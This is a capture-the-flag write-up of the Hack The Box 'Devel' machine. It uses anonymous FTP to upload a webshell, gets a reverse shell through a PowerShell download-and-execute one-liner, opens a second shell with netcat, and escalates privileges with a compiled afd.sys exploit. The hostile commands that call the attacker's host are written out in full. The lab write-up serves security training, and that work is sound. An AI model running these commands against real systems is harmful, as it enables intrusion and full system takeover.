<p align="center">
  <img width="300" src="https://user-images.githubusercontent.com/43796175/107217985-ff302900-69dc-11eb-999b-b1da568d1ff9.jpg" alt="DEVEL: Write Up">
</p>


# 01: Information Gathering

For starting, run nmap with a basic scan:

<p align="center"><img src="https://user-images.githubusercontent.com/43796175/107400057-70e89f80-6acf-11eb-95f3-6870ccbbe0b0.jpg"></p>

Two open ports can be seen, 21 FTP and 80 HTTP. Now, run again nmap but this time with an more advanced scan against the ports found:

<p align="center"><img src="https://user-images.githubusercontent.com/43796175/107400771-274c8480-6ad0-11eb-84f7-7b9a8b83b733.jpg"></p>

In this point, you can think about login in FTP with Anonymous credentials (port 21) and go more deep through HTTP and fuzzing (port 80).

# 02: Threat Modeling

Login in FTP with username and password "Anonymous" is possible:

<p align="center"><img src="https://user-images.githubusercontent.com/43796175/107401864-4bf52c00-6ad1-11eb-9a7b-f795670ea890.jpg"></p>

Think if you can reach any files in the directory through which you had FTP access. For example, try to get through HTTP request the image "welcome.png":

<p align="center"><img src="https://user-images.githubusercontent.com/43796175/107403079-b0fd5180-6ad2-11eb-80f8-092abfe6745e.jpg"></p>

Perfect, now you can try upload a webshell and visualize it in the browser:

# 03: Vulnerability Analysis

You can search the webshell necessary simply googling it. I found the next webshell which work fine:

<p align="center"><img src="https://user-images.githubusercontent.com/43796175/107413191-77324800-6ade-11eb-9dea-e66478f2d98e.jpg"></p>

<p align="center">https://raw.githubusercontent.com/tennc/webshell/master/fuzzdb-webshell/asp/cmdasp.aspx</p>

With FTP upload the webshell, using "put" command for this purpose:

<p align="center"><img src="https://user-images.githubusercontent.com/43796175/107413380-b1034e80-6ade-11eb-9557-089ca6cb717b.jpg"></p>

Try to see the webshell through browser, in http://10.10.10.5/cmdasp.aspx:

<p align="center"><img src="https://user-images.githubusercontent.com/43796175/107413825-34bd3b00-6adf-11eb-825d-a8d618e3ae18.jpg"></p>

You can see that is possible run commands efectly, then the more obviusly thought is get a reverse shell. For this, use Nishang that is a framework and collection of scripts and payloads which enables usage of PowerShell, in concret, you go to use the module of shells PS "Invoke-PowerShellTcp.ps1":

<p align="center"><img src="https://user-images.githubusercontent.com/43796175/107414596-39362380-6ae0-11eb-84c9-9d326bf577c9.jpg"></p>

<p align="center">https://github.com/samratashok/nishang/tree/master/Shells</p>

# 04: Exploitation

Download the RAW file of this module:

<p align="center"><img src="https://user-images.githubusercontent.com/43796175/107417782-f1190000-6ae3-11eb-8bb1-4e254b43e2b2.jpg"></p>

A good approach is execute the reverseShell in memory, like Nishang project describe:

<p align="center">https://github.com/samratashok/nishang</p>

"*Method 1. Use the in-memory dowload and execute: Use below command to execute a PowerShell script from a remote shell, meterpreter native shell, a web shell etc. and the function exported by it. All the scripts in Nishang export a function with same name in the current PowerShell session.*"

The next line is used for this:

```ps
powershell iex (New-Object Net.WebClient).DownloadString('http://<yourwebserver>/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress [IP] -Port [PortNo.]
```

Change the value necessary with your VPN IP address and port:

```ps
powershell iex (New-Object Net.WebClient).DownloadString('http://<YourVpnIP>:1234/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress <YourVpnIP> -Port 1337
```

Configure a python server in port 1234 and netcat listening in the port 1337:

<p align="center"><img src="https://user-images.githubusercontent.com/43796175/107417029-2cff9580-6ae3-11eb-979b-a16af27eb2cc.jpg"></p>

Paste the code in the webShell and you recive the reverse connection:

<p align="center"><img src="https://user-images.githubusercontent.com/43796175/107418832-2114d300-6ae5-11eb-80d1-e63f9dca3e5d.jpg"></p>

<p align="center"><img src="https://user-images.githubusercontent.com/43796175/107418604-dabf7400-6ae4-11eb-95ef-d829c5de8ee1.jpg"></p>

# 05: Post-Exploitation

The first step for me is run "*systeminfo*" command in Windows a look for "Hotfix(s)" in the OS:

<p align="center"><img src="https://user-images.githubusercontent.com/43796175/107423243-1ad52580-6aea-11eb-9668-1ac1c56fdc78.jpg"></p>

From the above information, you know that:

* OS is Windows 7 Enterprise
* OS Version 6.1.7600
* OS has no anyone Hotfix done

Then, a quickly search in Google gives some one results, you wanna see the results relationated with "*afd.sys*":

<p align="center"><img src="https://user-images.githubusercontent.com/43796175/107424736-02fea100-6aec-11eb-9759-3a1110216d4d.jpg"></p>

The vulnerability make reference to the [Ancillary Function Driver](https://file.info/windows/afd_sys.html) (AFD) supports Windows sockets applications and is contained in the afd.sys file. The afd.sys driver runs in kernel mode and manages the Winsock TCP/IP communications protocol. 

An elevation of privilege vulnerability exists where the AFD improperly validates input passed from user mode to the kernel.

An attacker must have valid logon credentials and be able to log on locally to exploit the vulnerability.

An attacker who successfully exploited this vulnerability could run arbitrary code in kernel mode (i.e. with NT AUTHORITY\SYSTEM privileges).

<p align="center"><img src="https://user-images.githubusercontent.com/43796175/107425166-a2bc2f00-6aec-11eb-8601-267fe5ab42a9.jpg"></p>

<p align="center">https://www.exploit-db.com/exploits/40564</p>

Download the exploit:

<p align="center"><img src="https://user-images.githubusercontent.com/43796175/107426493-4ce88680-6aee-11eb-9d37-7a53672b5f7e.jpg"></p>

And now you need compile this exploit with *i686-w64-mingw32-gcc*:

``
i686-w64-mingw32-gcc exploit.c -o okExploit.exe -lws2_32
``

The parameter "*-lws2_32*" specific the library to use for compile:

<p align="center"><img src="https://user-images.githubusercontent.com/43796175/107426914-d26c3680-6aee-11eb-9bd0-d666c78aec4d.jpg"></p>

Now you can get another revShell from your victim machine to you attacker machine. Search netcat in the path of binaries and configure SMB Server for share the file between machines:

Attacker machine:

<p align="center"><img src="https://user-images.githubusercontent.com/43796175/107429043-7525b480-6af1-11eb-8d44-7c02095fae56.jpg"></p>

Victim machine:

<p align="center"><img src="https://user-images.githubusercontent.com/43796175/107429386-d9e10f00-6af1-11eb-96fb-f3850a304cab.jpg"></p>

Then, run netcat in both machines for connection:

```
- Victim machine:

.\nc.exe -e cmd.exe <yourVpnIP> <yourPORT>
```

```
- Attacker machine:

nc -lnvp 1338
```

<p align="center"><img src="https://user-images.githubusercontent.com/43796175/107429726-3ba17900-6af2-11eb-8b25-bf034e303e16.jpg"></p>

At this point, you have another shell, so you should proceed download the *okExploit.exe* in Devel machine with SMB that was configured before. Let's try run the exploit previously compiled for get a privilege escalation:

<p align="center"><img src="https://user-images.githubusercontent.com/43796175/107430804-a8694300-6af3-11eb-85dc-ecd2474d2ad4.jpg"></p>

And it's gone.
